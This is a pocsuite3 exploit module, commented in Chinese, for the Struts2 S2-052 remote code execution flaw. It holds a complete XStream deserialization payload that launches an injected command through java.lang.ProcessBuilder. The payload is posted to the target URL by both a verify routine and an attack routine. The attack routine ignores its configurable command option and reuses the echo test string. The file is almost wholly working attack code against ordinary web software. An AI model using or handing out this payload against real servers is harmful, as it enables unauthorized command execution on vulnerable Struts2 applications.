from collections import OrderedDict

from requests.exceptions import ReadTimeout
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE, OptString


class DemoPOC(POCBase):
    vulID = '0'  # ssvid
    version = '1'
    appName = 'Struts2'
    appVersion = '2.1.2 - 2.3.33, 2.5 - 2.5.12'
    name = 'Struts2-052远程代码执行'
    desc = '''Struts2-052远程代码执行'''
    pocDesc = '''Struts2-052远程代码执行'''
    vulType = VUL_TYPE.CODE_EXECUTION
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    protocol = POC_CATEGORY.PROTOCOL.HTTP
    references = ['https://github.com/vulhub/vulhub/blob/master/struts2/s2-052/README.zh-cn.md']

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("whoami", description="攻击时自定义命令")
        return o

    # 该漏洞会报500错误，不支持回显，但是命令会执行
    def _verify(self):

        HEADERS = {
            'Accept': 'text/html, application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Content-Type': 'application/xml'
        }

        result = {}
        cmd = "echo VuLnEcHoPoCSuCCeSS"
        payload = '''<map> <entry> <jdk.nashorn.internal.objects''' \
            '''.NativeString> <flags>0</flags> <value class="com.sun.xml.i''' \
            '''nternal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHand''' \
            '''ler> <dataSource class="com.sun.xml.internal.ws.encoding.xm''' \
            '''l.XMLMessage$XmlDataSource"> <is class="javax.crypto.Cipher''' \
            '''InputStream"> <cipher class="javax.crypto.NullCipher"> <ini''' \
            '''tialized>false</initialized> <opmode>0</opmode> <serviceIte''' \
            '''rator class="javax.imageio.spi.FilterIterator"> <iter class''' \
            '''="javax.imageio.spi.FilterIterator"> <iter class="java.util''' \
            '''.Collections$EmptyIterator"/> <next class="java.lang.Proces''' \
            '''sBuilder"> <command> <string>RECOMMAND</string> </command> ''' \
            '''<redirectErrorStream>false</redirectErrorStream> </next> </''' \
            '''iter> <filter class="javax.imageio.ImageIO$ContainsFilter">''' \
            ''' <method> <class>java.lang.ProcessBuilder</class> <name>sta''' \
            '''rt</name> <parameter-types/> </method> <name>foo</name> </f''' \
            '''ilter> <next class="string">foo</next> </serviceIterator> <''' \
            '''lock/> </cipher> <input class="java.lang.ProcessBuilder$Nul''' \
            '''lInputStream"/> <ibuffer></ibuffer> <done>false</done> <ost''' \
            '''art>0</ostart> <ofinish>0</ofinish> <closed>false</closed> ''' \
            '''</is> <consumed>false</consumed> </dataSource> <transferFla''' \
            '''vors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.n''' \
            '''ashorn.internal.objects.NativeString> <jdk.nashorn.internal''' \
            '''.objects.NativeString reference="../jdk.nashorn.internal.ob''' \
            '''jects.NativeString"/> </entry> <entry> <jdk.nashorn.interna''' \
            '''l.objects.NativeString reference="../../entry/jdk.nashorn.i''' \
            '''nternal.objects.NativeString"/> <jdk.nashorn.internal.objec''' \
            '''ts.NativeString reference="../../entry/jdk.nashorn.internal''' \
            '''.objects.NativeString"/> </entry> </map>'''
        url = self.url
        payload = payload.replace("RECOMMAND", cmd)

        try:
            response = requests.post(url, data=payload, headers=HEADERS)
            if response.status_code == 500 and r"java.security.Provider$Service" in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['PostData'] = payload
        except ReadTimeout:
            pass
        except Exception as e:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    # 该漏洞会报500错误，不支持回显，但是命令会执行
    def _attack(self):
        HEADERS = {
            'Accept': 'text/html, application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Content-Type': 'application/xml'
        }

        result = {}
        cmd = "echo VuLnEcHoPoCSuCCeSS"
        payload = '''<map> <entry> <jdk.nashorn.internal.objects''' \
                  '''.NativeString> <flags>0</flags> <value class="com.sun.xml.i''' \
                  '''nternal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHand''' \
                  '''ler> <dataSource class="com.sun.xml.internal.ws.encoding.xm''' \
                  '''l.XMLMessage$XmlDataSource"> <is class="javax.crypto.Cipher''' \
                  '''InputStream"> <cipher class="javax.crypto.NullCipher"> <ini''' \
                  '''tialized>false</initialized> <opmode>0</opmode> <serviceIte''' \
                  '''rator class="javax.imageio.spi.FilterIterator"> <iter class''' \
                  '''="javax.imageio.spi.FilterIterator"> <iter class="java.util''' \
                  '''.Collections$EmptyIterator"/> <next class="java.lang.Proces''' \
                  '''sBuilder"> <command> <string>RECOMMAND</string> </command> ''' \
                  '''<redirectErrorStream>false</redirectErrorStream> </next> </''' \
                  '''iter> <filter class="javax.imageio.ImageIO$ContainsFilter">''' \
                  ''' <method> <class>java.lang.ProcessBuilder</class> <name>sta''' \
                  '''rt</name> <parameter-types/> </method> <name>foo</name> </f''' \
                  '''ilter> <next class="string">foo</next> </serviceIterator> <''' \
                  '''lock/> </cipher> <input class="java.lang.ProcessBuilder$Nul''' \
                  '''lInputStream"/> <ibuffer></ibuffer> <done>false</done> <ost''' \
                  '''art>0</ostart> <ofinish>0</ofinish> <closed>false</closed> ''' \
                  '''</is> <consumed>false</consumed> </dataSource> <transferFla''' \
                  '''vors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.n''' \
                  '''ashorn.internal.objects.NativeString> <jdk.nashorn.internal''' \
                  '''.objects.NativeString reference="../jdk.nashorn.internal.ob''' \
                  '''jects.NativeString"/> </entry> <entry> <jdk.nashorn.interna''' \
                  '''l.objects.NativeString reference="../../entry/jdk.nashorn.i''' \
                  '''nternal.objects.NativeString"/> <jdk.nashorn.internal.objec''' \
                  '''ts.NativeString reference="../../entry/jdk.nashorn.internal''' \
                  '''.objects.NativeString"/> </entry> </map>'''
        url = self.url
        payload = payload.replace("RECOMMAND", cmd)

        try:
            response = requests.post(url, data=payload, headers=HEADERS)
            if response.status_code == 500 and r"java.security.Provider$Service" in response.text:
                result['Stdout'] = "该漏洞利用没有回显"
        except ReadTimeout:
            pass
        except Exception as e:
            pass

        return self.parse_output(result)



register_poc(DemoPOC)
